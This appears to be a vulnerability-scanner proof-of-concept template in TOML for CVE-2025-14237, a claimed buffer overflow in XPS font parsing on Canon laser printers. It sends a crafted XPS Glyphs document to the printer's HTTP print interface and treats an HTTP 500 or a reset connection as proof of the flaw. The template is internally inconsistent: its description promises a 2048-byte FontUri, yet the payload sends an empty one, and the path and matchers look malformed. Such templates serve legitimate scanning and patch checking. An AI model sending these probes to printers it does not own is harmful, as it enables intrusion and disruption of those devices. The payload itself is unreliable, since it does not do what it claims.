[info]
author = "AVE"
description = "向 Canon 打印机 HTTP 管理接口发送特制 XPS 文档，其中包含超长 FontUri 属性（2048字节），触发 XPS 字形运行属性处理中的缓冲区溢出（CWE-787）。若目标固件版本 <= v06.02，连接被重置或返回 HTTP 500 表明漏洞存在。"
id = "POC-AVE-2025-0360"
name = "Canon 多款激光打印机 XPS字体解析缓冲区溢出远程代码执行漏洞 PoC"
severity = "critical"
tags = [
    "cve-2025-14237",
    "canon",
    "xps",
    "bof",
    "rce",
    "printer",
]
vuln_id = [
    "CVE-2025-14237",
    "AVE-2025-0360",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/print"
protocol = "http"

[poc.requests.body]
content = '<?xml version="1.0" encoding="UTF-8"?><Glyphs FontUri="" FontRenderingEmSize="12.0" UnicodeString="Test" OriginX="0" OriginY="0"/>'
type = "raw"

[poc.requests.headers]
Connection = "close"
Content-Type = "application/oxps"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["500"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "connection reset",
    "connection refused",
]
